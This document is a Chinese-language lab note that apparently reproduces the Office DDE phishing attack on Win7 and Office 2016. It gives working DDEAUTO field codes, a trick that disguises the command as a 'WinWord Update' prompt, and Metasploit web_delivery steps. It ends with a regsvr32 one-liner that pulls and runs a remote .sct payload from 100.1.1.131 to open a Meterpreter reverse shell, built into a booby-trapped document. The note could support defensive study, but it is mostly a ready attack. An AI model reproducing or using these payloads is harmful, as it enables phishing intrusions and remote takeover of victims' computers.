# DDE

> 环境: Win7 + Office 2016
>
> 可以在 [MSDN, 我告诉你 - 做一个安静的工具站 (itellyou.cn)](https://msdn.itellyou.cn/?ang=2h-cn) 找对应的镜像
>
> - Office 2016: `ed2k://|file|cn_office_professional_plus_2016_x86_x64_dvd_6969182.iso|2588266496|27EEA4FE4BB13CD0ECCDFC24167F9E01|/`
>
> - Win7:
>
>   [原版软件 (itellyou.cn)](https://next.itellyou.cn/Original/#cbp=Product?ID=6f677346-0a09-43fa-b60d-e878ed7625a0)
>
>   

> [鱼叉钓鱼：利用 Office 文档进行 DDE 攻击-腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1816083)

DDE (Dynamic Data Exchange) 是一种用于在Windows应用程序之间交换数据的协议

攻击者可以利用 DDE 通过自定义字段插入到Word或Excel文档中，用于执行恶意代码

---

当用户打开包含DDE字段的文档时，Office应用程序会显示两个警告：

1. **第一个警告**：告知文档包含指向其他文件的链接。
2. **第二个警告**：告知将打开远程命令提示符。

如果用户忽略警告并允许操作，恶意命令将被执行，导致系统被攻击

---

例如: 创建一个文档 `DDE.docx`, 打开后使用 `Ctrl+F9(或者选中"插入"-"文件部件"-"域", 选中第一个 = (Formula) 然后右键切换域代码来编辑代码)` 

---

## 弹计算器

> [鱼叉钓鱼：利用 Office 文档进行 DDE 攻击-腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1816083)

以打开计算器为例, 在域代码中输入如下内容

```JavaScript
DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"
```

![image-20240606103628125](http://cdn.ayusummer233.top/DailyNotes/202406061623809.png)

保存后重新打开即可触发域代码执行

---

> 在 Office365 和 Office 2013 的 Word 上都没复现出来,都只有如下第一条警告, 然后就没有动静了
>
> ![image-20240517153248330](http://cdn.ayusummer233.top/DailyNotes/202405171532647.png)
>
> ---
>
> 后续在 Win7+Office2016 成功执行了 DDE
>
> ![image-20240606103518902](http://cdn.ayusummer233.top/DailyNotes/202406061623666.png)
>
> ![image-20240606103531060](http://cdn.ayusummer233.top/DailyNotes/202406061623998.png)
>
> ![image-20240606103541298](http://cdn.ayusummer233.top/DailyNotes/202406061623404.png)

也可以伪装一下

> [谨防钓鱼——OFFICE DDE复现_execl dde漏洞 复现-CSDN博客](https://blog.csdn.net/tempulcc/article/details/108471488)

```js
DDEAUTO C:\\Programs\\Office\\Updates\\WINWORD.exe/../../../../Windows\\System32\\cmd.exe "WinWord Update                                  /k calc.exe"
```

> PS: WinWord Update 和 `/k` 之间多加些空格, 否则效果不是很好:
>
> ![image-20240606181142069](http://cdn.ayusummer233.top/DailyNotes/202406061811150.png)
>
> ![image-20240606181228410](http://cdn.ayusummer233.top/DailyNotes/202406061812566.png)
>
> ![image-20240606181240958](http://cdn.ayusummer233.top/DailyNotes/202406061812069.png)

![image-20240606181847082](http://cdn.ayusummer233.top/DailyNotes/202406061818175.png)

![image-20240606181815913](http://cdn.ayusummer233.top/DailyNotes/202406061818994.png)

![image-20240606181828940](http://cdn.ayusummer233.top/DailyNotes/202406061818028.png)

---

## 反弹Shell

```bash
msf > use exploit/multi/script/web_delivery
msf > set target 3
msf > set payload windows/meterpreter/reverse_tcp_uuid
msf > set lhost [msf主机要监听的本地ip地址]
msf > set lport [msf主机要监听的本地端口]
msf exploit(multi/script/web_delivery) > exploit -j 
[*] Exploit running as background job 0.
```

- `target 3 -> Regsvr32`

  `regsvr32` 是 Windows 的一个命令行工具, 用于在 Windows 注册表中注册和注销 COM（Component Object Model）对象。这些对象通常是 DLL（动态链接库）或 OCX（ActiveX 控件）文件。注册这些文件允许它们被其他程序调用和使用。

- `windows/meterpreter/reverse_tcp_uuid`: 用于在目标 Windows 系统上建立一个反向连接的 Meterpreter 会话

  与 `windows/meterpreter/reverse_tcp` 类似，但它包含了 UUID（通用唯一标识符）的支持，这有助于在目标系统上运行多个实例时进行区分。这在一些复杂的攻击场景中非常有用，可以更好地管理和跟踪不同的会话。

- `exploit -j`: 启动一个漏洞利用模块并将其作为后台作业（job）运行

  `-j` 表示以作业的方式在后台运行，这意味着漏洞利用模块不会阻塞当前的控制台，允许用户在当前会话中执行其他命令或操作

![image-20240606105827774](http://cdn.ayusummer233.top/DailyNotes/202406061623460.png)

得到上线命令:

```cmd
regsvr32 /s /n /u /i:http://100.1.1.131:8080/pakhnAAjLe0wl.sct scrobj.dll
```

- **/s**：静默模式，执行过程中不显示任何消息框

- **/n**：不用 `DllRegisterServer`，而是使用 `DllInstall` 方法

- **/u**：卸载模式，与 `/i` 参数一起使用时，会调用 `DllInstall` 方法以卸载而不是安装

- **/i:http://100.1.1.131:8080/pakhnAAjLe0wl.sct**：指定传递给 `DllInstall` 方法的参数

  这里是一个远程 URL，指向一个 `.sct` 脚本文件，`regsvr32` 会下载并执行它

  ![image-20240606133303334](http://cdn.ayusummer233.top/DailyNotes/202406061623428.png)

  ![image-20240606133342964](http://cdn.ayusummer233.top/DailyNotes/202406061623821.png)

  具体来说是调 WScript 调 Powershell 执行编码了的命令; 解码后的命令为:

  ![image-20240606143717556](http://cdn.ayusummer233.top/DailyNotes/202406061623227.png)

  最终还是回到下载远程字符串命令并执行, 具体命令为:

  ![image-20240606144027647](http://cdn.ayusummer233.top/DailyNotes/202406061623408.png)

  具体就不往后解了, 还套了好几层, 等后续做个 Powershell 解混淆的专项研究, 收集和编写一些可用工具再看, 人力解混淆太耗时间了

- **scrobj.dll**：指定要使用的 DLL 文件，这里是 `scrobj.dll`, 全称为 "Script Object Model DLL", 是 Windows 脚本宿主（Windows Script Host，简称 WSH）的一部分, 提供了运行和管理脚本的功能

  WSH 支持多种脚本语言，如 VBScript 和 JScript，允许用户编写和执行脚本来自动化任务

---

得到的反弹代码是:

```cmd
regsvr32 /s /n /u /i:http://100.1.1.131:8080/pakhnAAjLe0wl.sct scrobj.dll
```

写成 DDE 就是

```js
DDEAUTO c:\\windows\\system32\\cmd.exe "/k regsvr32 /s /n /u /i:http://100.1.1.131:8080/pakhnAAjLe0wl.sct scrobj.dll"
```

![image-20240606152651583](http://cdn.ayusummer233.top/DailyNotes/202406061623511.png)

保存后重新打开:

![image-20240606152745928](http://cdn.ayusummer233.top/DailyNotes/202406061623626.png)

![image-20240606152808558](http://cdn.ayusummer233.top/DailyNotes/202406061624209.png)

![image-20240606152851391](http://cdn.ayusummer233.top/DailyNotes/202406061624930.png)

![image-20240606175736169](http://cdn.ayusummer233.top/DailyNotes/202406061758785.png)

---

## 相关链接

- [鱼叉钓鱼：利用 Office 文档进行 DDE 攻击-腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1816083)
- [钓鱼攻击：Office DDE 漏洞复现笔记 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/32103256)
- [干货 | Office文档钓鱼的实战和免杀技巧-腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1917641)
- [鱼叉钓鱼：利用 Office 文档进行 DDE 攻击_dde攻击-CSDN博客](https://blog.csdn.net/weixin_45575473/article/details/115894657)
- [wps和office宏钓鱼从认识到免杀 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/network/317116.html)
- [谨防钓鱼——OFFICE DDE复现-CSDN博客](https://blog.csdn.net/tempulcc/article/details/108471488)
- [钓鱼攻击：Office DDE 漏洞复现笔记 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/32103256)
- [常见钓鱼招式 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/10339?time__1311=Cqjx2QD%3DiteWqGNDQimOgbtDtt0QtDReOYD)
- [office-exploits/DDEAUTO at master · SecWiki/office-exploits · GitHub](https://github.com/SecWiki/office-exploits/tree/master/DDEAUTO)

---





